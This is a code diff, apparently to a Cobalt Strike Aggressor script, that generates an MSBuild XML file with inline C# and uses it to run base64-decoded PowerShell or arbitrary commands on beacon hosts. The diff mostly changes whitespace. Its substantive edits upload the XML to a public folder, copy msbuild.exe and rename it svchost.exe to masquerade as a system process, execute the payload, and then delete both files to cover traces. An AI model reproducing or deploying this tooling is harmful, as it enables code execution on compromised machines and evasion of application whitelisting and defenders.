@@ -11,87 +11,87 @@
   <Target Name="Hello">
    <ClassExample />
   </Target>
-	<UsingTask
+    <UsingTask
     TaskName="ClassExample"
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-	<Task>
-	  <Reference Include="System.Management.Automation" />
+    <Task>
+      <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs">
         <![CDATA[
-			using System;
-			using System.IO;
-			using System.Diagnostics;
-			using System.Reflection;
-			using System.Runtime.InteropServices;
-			using System.Collections.ObjectModel;
-			using System.Management.Automation;
-			using System.Management.Automation.Runspaces;
-			using System.Text;
-			using Microsoft.Build.Framework;
-			using Microsoft.Build.Utilities;
-			public class ClassExample :  Task, ITask
-			{
-				public string funcName = "$(FunctionName)";
-				public string Cmd = "$(Cmd)";
-				public string outFile = "$(OutFilePath)";
-				public override bool Execute()
-				{';
+            using System;
+            using System.IO;
+            using System.Diagnostics;
+            using System.Reflection;
+            using System.Runtime.InteropServices;
+            using System.Collections.ObjectModel;
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+            using System.Text;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            public class ClassExample :  Task, ITask
+            {
+                public string funcName = "$(FunctionName)";
+                public string Cmd = "$(Cmd)";
+                public string outFile = "$(OutFilePath)";
+                public override bool Execute()
+                {';
 %globalsettings['PostPoSh'] = 'string x = "";
 
-					if (funcName != "None")
-					{
-						byte[] data = Convert.FromBase64String(encScript);
-						string command = Encoding.ASCII.GetString(data);
-						x = command + "\n" + funcName;
-					}
-					else if (Cmd != "None")
-					{
-						x = Cmd;
-					}
-					if (outFile != "None")
-					{
-						x += " | Out-File -Encoding ascii -FilePath " + outFile;
-					}
+                    if (funcName != "None")
+                    {
+                        byte[] data = Convert.FromBase64String(encScript);
+                        string command = Encoding.ASCII.GetString(data);
+                        x = command + "\n" + funcName;
+                    }
+                    else if (Cmd != "None")
+                    {
+                        x = Cmd;
+                    }
+                    if (outFile != "None")
+                    {
+                        x += " | Out-File -Encoding ascii -FilePath " + outFile;
+                    }
 
-					try
-					{
-						Console.Write(RunPSCommand(x));
-					}
-					catch (Exception e)
-					{
-						Console.Write(e.Message);
-					}
-								return true;
-				}
-				public static string RunPSCommand(string cmd)
-				{
-					
-					Runspace runspace = RunspaceFactory.CreateRunspace();
-					runspace.Open();
-					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
-					Pipeline pipeline = runspace.CreatePipeline();
+                    try
+                    {
+                        Console.Write(RunPSCommand(x));
+                    }
+                    catch (Exception e)
+                    {
+                        Console.Write(e.Message);
+                    }
+                                return true;
+                }
+                public static string RunPSCommand(string cmd)
+                {
+                    
+                    Runspace runspace = RunspaceFactory.CreateRunspace();
+                    runspace.Open();
+                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+                    Pipeline pipeline = runspace.CreatePipeline();
 
-					pipeline.Commands.AddScript(cmd);
-					
-					pipeline.Commands.Add("Out-String");
-					Collection<PSObject> results = pipeline.Invoke();
-					runspace.Close();
+                    pipeline.Commands.AddScript(cmd);
+                    
+                    pipeline.Commands.Add("Out-String");
+                    Collection<PSObject> results = pipeline.Invoke();
+                    runspace.Close();
 
-					StringBuilder stringBuilder = new StringBuilder();
-					foreach (PSObject obj in results)
-					{
-						stringBuilder.Append(obj);
-					}
-					return stringBuilder.ToString().Trim();
-				 }
-				 
-				 public static void RunPSFile(string script)
-				{
-					PowerShell ps = PowerShell.Create();
-					ps.AddScript(script).Invoke();
-				}
-			}	
+                    StringBuilder stringBuilder = new StringBuilder();
+                    foreach (PSObject obj in results)
+                    {
+                        stringBuilder.Append(obj);
+                    }
+                    return stringBuilder.ToString().Trim();
+                 }
+                 
+                 public static void RunPSFile(string script)
+                {
+                    PowerShell ps = PowerShell.Create();
+                    ps.AddScript(script).Invoke();
+                }
+            }   
         ]]>
       </Code>
     </Task>
@@ -125,7 +125,7 @@ sub posh_cmd {
 
 sub cmd_pwn {
 
-	# Build Command section of msbuild xml file
+    # Build Command section of msbuild xml file
     $cmd_set = "\n      <FunctionName Condition=\"\'\$(FunctionName)\' == \'\'\">None</FunctionName>\n<Cmd Condition=\"\'\$(Cmd)\' == \'\'\">". $3['Command'] ."</Cmd>\n";
     if ($3['OutPath'] ne "") {
       $cmd_set = $cmd_set."<OutFilePath Condition=\"\'\$(OutFilePath)\' == \'\'\">". $3['OutPath'] ."</OutFilePath>\n";
@@ -149,15 +149,15 @@ sub cmd_pwn {
     # Upload xml file, copy msbuild and rename, trigger xml via msbuild, remove file and renamed msbuild
     foreach $beacon (beacons()) {
         if ($3['Target'] eq $beacon['pid']) {
-        	$read_handle = openf("/tmp/msbuildme.xml");
-        	$data_here = readb($read_handle, -1);
-        	closef($read_handle);
-        	bupload_raw($beacon['id'], "C:\\Users\\Public\\Documents\\trusteddata.xml", $data_here);
-        	bpowerpick($beacon['id'], "copy-item C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Users\\Public\\Documents\\svchost.exe");
-        	bpowerpick($beacon['id'], "C:\\Users\\Public\\Documents\\svchost.exe C:\\Users\\Public\\Documents\\trusteddata.xml");
-        	bpowerpick($beacon['id'], "rm C:\\Users\\Public\\Documents\\trusteddata.xml");
-        	bpowerpick($beacon['id'], "rm C:\\Users\\Public\\Documents\\svchost.exe");
-        	exec("rm /tmp/msbuildme.xml");
+            $read_handle = openf("/tmp/msbuildme.xml");
+            $data_here = readb($read_handle, -1);
+            closef($read_handle);
+            bupload_raw($beacon['id'], "C:\\Users\\Public\\Documents\\trusteddata.xml", $data_here);
+            bpowerpick($beacon['id'], "copy-item C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Users\\Public\\Documents\\svchost.exe");
+            bpowerpick($beacon['id'], "C:\\Users\\Public\\Documents\\svchost.exe C:\\Users\\Public\\Documents\\trusteddata.xml");
+            bpowerpick($beacon['id'], "rm C:\\Users\\Public\\Documents\\trusteddata.xml");
+            bpowerpick($beacon['id'], "rm C:\\Users\\Public\\Documents\\svchost.exe");
+            exec("rm /tmp/msbuildme.xml");
         }
     }
 }
@@ -209,9 +209,11 @@ alias msbuild_script {
     $read_handle = openf("/tmp/msbuildme.xml");
     $data_here = readb($read_handle, -1);
     closef($read_handle);
-    bupload_raw($1, "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml", $data_here);
-    bpowerpick($1, "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml");
-    bpowerpick($1, "rm C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml");
+    bupload_raw($1, "C:\\Users\\Public\\Documents\\trusteddata.xml", $data_here);
+    bpowerpick($1, "copy-item C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Users\\Public\\Documents\\svchost.exe");
+    bpowerpick($1, "C:\\Users\\Public\\Documents\\svchost.exe C:\\Users\\Public\\Documents\\trusteddata.xml");
+    bpowerpick($1, "rm C:\\Users\\Public\\Documents\\trusteddata.xml");
+    bpowerpick($1, "rm C:\\Users\\Public\\Documents\\svchost.exe");
     exec("rm /tmp/msbuildme.xml");
 }
 
@@ -237,8 +239,10 @@ alias msbuild_cmd {
     $read_handle = openf("/tmp/msbuildme.xml");
     $data_here = readb($read_handle, -1);
     closef($read_handle);
-    bupload_raw($1, "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml", $data_here);
-    bpowerpick($1, "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml");
-    bpowerpick($1, "rm C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\trusteddata.xml");
+    bupload_raw($1, "C:\\Users\\Public\\Documents\\trusteddata.xml", $data_here);
+    bpowerpick($1, "copy-item C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Users\\Public\\Documents\\svchost.exe");
+    bpowerpick($1, "C:\\Users\\Public\\Documents\\svchost.exe C:\\Users\\Public\\Documents\\trusteddata.xml");
+    bpowerpick($1, "rm C:\\Users\\Public\\Documents\\trusteddata.xml");
+    bpowerpick($1, "rm C:\\Users\\Public\\Documents\\svchost.exe");
     exec("rm /tmp/msbuildme.xml");
 }
